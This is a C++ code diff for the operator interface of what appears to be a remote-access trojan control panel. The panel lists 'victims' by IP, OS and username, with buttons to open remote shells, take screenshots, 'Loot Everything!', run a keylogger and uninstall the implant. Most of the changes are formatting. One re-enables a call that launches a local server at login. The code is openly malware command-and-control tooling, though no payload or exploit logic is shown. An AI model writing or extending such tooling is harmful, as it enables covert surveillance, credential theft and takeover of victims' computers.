@@ -273,10 +273,10 @@ void drawConnectionsTab(WindowState& state) {
             vic.external_ip,
             vic.operating_system,
             vic.username,
-            vic.status < 5 ? "ONLINE" : "OFFLINE"
+            vic.status == 1 ? "ONLINE" : "OFFLINE"
         };
 
-        for (int i = 0; i < colCount; i++) {
+        for (int i = 0; i < colCount; ++i) {
             Rectangle r{tableRect.x + i * colWidth, tableRect.y + scroll.y + 26 + (25*client_id), colWidth, 24};
             GuiDrawRectangle(r, 1, BLACK, line_color);
             GuiLabel(r, values[i].c_str());
@@ -317,7 +317,7 @@ void drawConnectionsTab(WindowState& state) {
         const auto victim = victims[selectedRow];
 
         if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
-            if(state.client.sendTimeoutCommand(victim.uid, timeout)) {
+            if (state.client.sendTimeoutCommand(victim.uid, timeout)) {
                 logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
             } else {
                 logMan.local_log("Sending Timeout Command failed!");
@@ -326,7 +326,7 @@ void drawConnectionsTab(WindowState& state) {
         }
 
         if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
-            if(state.client.sendOpenSessionCommand(victim.uid, port)) {
+            if (state.client.sendOpenSessionCommand(victim.uid, port)) {
                 logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));
             } else {
                 logMan.local_log("Sending Open Session Command failed!");
@@ -335,7 +335,7 @@ void drawConnectionsTab(WindowState& state) {
             state.current_tab = Tab::TERMINAL;
         }
         if (GuiButton(btn3, "Close open Shells")) {
-            if(state.client.sendCloseSessionCommand(victim.uid)) {
+            if (state.client.sendCloseSessionCommand(victim.uid)) {
                 logMan.attack_log(std::format("Closing Open Sessions for Client: {}", victim.uid));
             } else {
                 logMan.local_log("Sending Timeout Command failed!");
@@ -343,7 +343,7 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn4, "Take Screenshot")) {
-            if(state.client.sendScreenshotCommand((victim.uid))) {
+            if (state.client.sendScreenshotCommand((victim.uid))) {
                 logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
             } else {
                 logMan.local_log("Sending Screenshot Command failed!");
@@ -351,7 +351,7 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn5, "Loot Everything!")) {
-            if(state.client.sendLootCommand(victim.uid)) {
+            if (state.client.sendLootCommand(victim.uid)) {
                 logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
             } else {
                 logMan.local_log("Sending Loot Command failed!");
@@ -359,7 +359,7 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn6, "Start Keylogger")) {
-            if(state.client.sendStartKeyloggerCommand(victim.uid)) {
+            if (state.client.sendStartKeyloggerCommand(victim.uid)) {
                 logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
             } else {
                 logMan.local_log("Starting Keylogger failed!");
@@ -367,7 +367,7 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn7, "Stop Keylogger")) {
-            if(state.client.sendStopKeyloggerCommand(victim.uid)) {
+            if (state.client.sendStopKeyloggerCommand(victim.uid)) {
                 logMan.attack_log(std::format("Stopping Keylogger on Client: {}", victim.uid));
             } else {
                 logMan.local_log("Stopping Keylogger failed!");
@@ -375,7 +375,7 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn8, "Uninstall Implant")) {
-            if(state.client.sendUninstallCommand(victim.uid)) {
+            if (state.client.sendUninstallCommand(victim.uid)) {
                 logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
             } else {
                 logMan.local_log("Uninstalling failed!");
@@ -464,7 +464,7 @@ void drawLogin(WindowState& state) {
         state.client.setUsername(state.user_settings.username.text);
         state.client.setPassword(state.user_settings.password.text);
 
-        //std::system("./server --local");
+        std::system("./server --local");
 
         state.is_connected = true;
     }
